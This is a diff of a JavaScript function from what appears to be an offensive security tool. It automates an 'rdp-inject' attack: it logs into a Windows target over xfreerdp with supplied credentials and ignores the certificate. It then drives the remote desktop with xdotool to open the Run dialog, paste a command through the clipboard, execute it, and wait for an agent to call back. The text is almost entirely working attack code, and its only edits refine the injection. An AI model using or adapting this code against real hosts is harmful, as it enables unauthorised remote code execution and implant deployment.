@@ -18246,82 +18246,54 @@ async function ipcRun(action) {
         // Password: full desktop; Ctrl+Shift+Esc → Task Manager → File → Run new task.
         // Avoids Win/Super key which Xvfb doesn't map, so super+r is silently dropped by xfreerdp.
         const xfreeCmd = `xfreerdp /v:${a.target}${rdpDomDQ} /u:"${uDQ}" /p:"${pDQ}" /cert:ignore /w:1024 /h:768 /log-level:WARN`;
-        const scr = `python3 /tmp/xwd2png.py`;
         const steps = [
           `command -v Xvfb >/dev/null 2>&1 || apt-get install -y xvfb -qq`,
           `command -v xdotool >/dev/null 2>&1 || apt-get install -y xdotool -qq`,
+          `command -v xclip >/dev/null 2>&1 || apt-get install -y xclip -qq`,
           `VDISP=:$(( $$ % 400 + 200 ))`,
-          `SCRDIR=/tmp/rdp_dbg_$$`,
-          `mkdir -p "$SCRDIR"`,
           `Xvfb "$VDISP" -screen 0 1024x768x24 & XVFB_PID=$!`,
           `sleep 1`,
           `KRB5_CONFIG=/home/kali/.krb5.conf DISPLAY="$VDISP" XAUTHORITY="" ${xfreeCmd} & RDP_PID=$!`,
           `echo "[*] Waiting for Windows desktop..."`,
           `sleep 25`,
-          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/01_desktop.xwd" 2>/dev/null && ${scr} "$SCRDIR/01_desktop.xwd" "$SCRDIR/01_desktop.png" && echo "[*] Screenshot 01_desktop saved"`,
           `WIN=$(DISPLAY="$VDISP" xdotool search --pid $RDP_PID 2>/dev/null | head -1)`,
           `[ -z "$WIN" ] && echo "[!] No window found" && kill $RDP_PID $XVFB_PID 2>/dev/null && exit 1`,
           `echo "[*] Window: $WIN"`,
-          // Click center of screen via XTEST (ButtonPress → xfreerdp sends RDP mouse event →
-          // Windows sets keyboard focus to whatever is under cursor, establishing input focus).
-          `echo "[*] Clicking desktop to establish RDP input focus..."`,
+          // Click center to establish RDP keyboard focus.
           `DISPLAY="$VDISP" xdotool mousemove --sync 512 400`,
           `sleep 0.2`,
           `DISPLAY="$VDISP" xdotool click 1`,
           `sleep 0.5`,
-          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/01b_after_click.xwd" 2>/dev/null && ${scr} "$SCRDIR/01b_after_click.xwd" "$SCRDIR/01b_after_click.png" && echo "[*] Screenshot 01b_after_click saved"`,
-          // Dismiss any active modal dialogs (e.g. PowerShell credential request, leftover Run dialog
-          // error, or file picker from a prior session) — send more Escapes to clear all layers.
-          `echo "[*] Closing leftover dialogs (Alt+F4 x4 then Escape x4)..."`,
-          `DISPLAY="$VDISP" xdotool key --clearmodifiers alt+F4`,
-          `sleep 0.3`,
-          `DISPLAY="$VDISP" xdotool key --clearmodifiers alt+F4`,
-          `sleep 0.3`,
-          `DISPLAY="$VDISP" xdotool key --clearmodifiers alt+F4`,
-          `sleep 0.3`,
-          `DISPLAY="$VDISP" xdotool key --clearmodifiers alt+F4`,
-          `sleep 0.3`,
-          `DISPLAY="$VDISP" xdotool key --clearmodifiers Escape`,
-          `sleep 0.2`,
+          // Dismiss any leftover dialogs with Escape — Alt+F4 on the desktop triggers
+          // the "Shut Down Windows" dialog and causes logoff if pressed multiple times.
           `DISPLAY="$VDISP" xdotool key --clearmodifiers Escape`,
           `sleep 0.2`,
           `DISPLAY="$VDISP" xdotool key --clearmodifiers Escape`,
           `sleep 0.2`,
           `DISPLAY="$VDISP" xdotool key --clearmodifiers Escape`,
           `sleep 0.5`,
-          // Right-click Start button → Win+X quick-access menu → 'r' opens Run dialog.
-          // Avoids Win/Super key (no xkb scancode in Xvfb) and Task Manager compact-mode menu issues.
-          `echo "[*] Right-clicking Start button for Win+X menu..."`,
+          // Right-click Start button → Win+X menu → 'r' opens Run dialog.
+          `echo "[*] Opening Run dialog..."`,
           `DISPLAY="$VDISP" xdotool mousemove --sync 12 748`,
           `sleep 0.2`,
           `DISPLAY="$VDISP" xdotool click 3`,
           `sleep 1.5`,
-          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/02_winx_menu.xwd" 2>/dev/null && ${scr} "$SCRDIR/02_winx_menu.xwd" "$SCRDIR/02_winx_menu.png" && echo "[*] Screenshot 02_winx_menu saved"`,
           // Load command into X11 clipboard — xfreerdp CLIPRDR syncs it to Windows.
-          // Avoids xdotool type keysym/layout issues (wrong chars, dropped /, Start.-Process etc.)
-          `command -v xclip >/dev/null 2>&1 || apt-get install -y xclip -qq`,
           `printf '%s' "${winCmd}" | DISPLAY="$VDISP" xclip -selection clipboard`,
-          `echo "[*] Clipboard set: ${winCmd}"`,
-          `echo "[*] Pressing r for Run..."`,
           `DISPLAY="$VDISP" xdotool key --clearmodifiers r`,
           `sleep 2`,
-          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/03_run_dialog.xwd" 2>/dev/null && ${scr} "$SCRDIR/03_run_dialog.xwd" "$SCRDIR/03_run_dialog.png" && echo "[*] Screenshot 03_run_dialog saved"`,
-          // Activate Run dialog by window name, select-all, then paste — no keysym translation.
           `RUNDLG=$(DISPLAY="$VDISP" xdotool search --onlyvisible --name "Run" 2>/dev/null | tail -1)`,
-          `echo "[*] Run dialog WID: $RUNDLG"`,
           `[ -n "$RUNDLG" ] && DISPLAY="$VDISP" xdotool windowactivate --sync $RUNDLG`,
           `sleep 0.3`,
           `DISPLAY="$VDISP" xdotool key --clearmodifiers ctrl+a`,
           `sleep 0.1`,
           `DISPLAY="$VDISP" xdotool key --clearmodifiers ctrl+v`,
           `sleep 0.5`,
-          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/04_cmd_pasted.xwd" 2>/dev/null && ${scr} "$SCRDIR/04_cmd_pasted.xwd" "$SCRDIR/04_cmd_pasted.png" && echo "[*] Screenshot 04_cmd_pasted saved"`,
           `[ -n "$RUNDLG" ] && DISPLAY="$VDISP" xdotool windowactivate --sync $RUNDLG`,
           `sleep 0.2`,
           `DISPLAY="$VDISP" xdotool key --clearmodifiers Return`,
           `sleep 2`,
-          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/05_after_return.xwd" 2>/dev/null && ${scr} "$SCRDIR/05_after_return.xwd" "$SCRDIR/05_after_return.png" && echo "[*] Screenshot 05_after_return saved"`,
-          `echo "[*] Screenshots in: $SCRDIR"`,
+          `echo "[+] rdp-inject sent — waiting for agent..."`,
           `sleep 45`,
           `kill $RDP_PID $XVFB_PID 2>/dev/null`,
           `echo "[+] rdp-inject done"`,
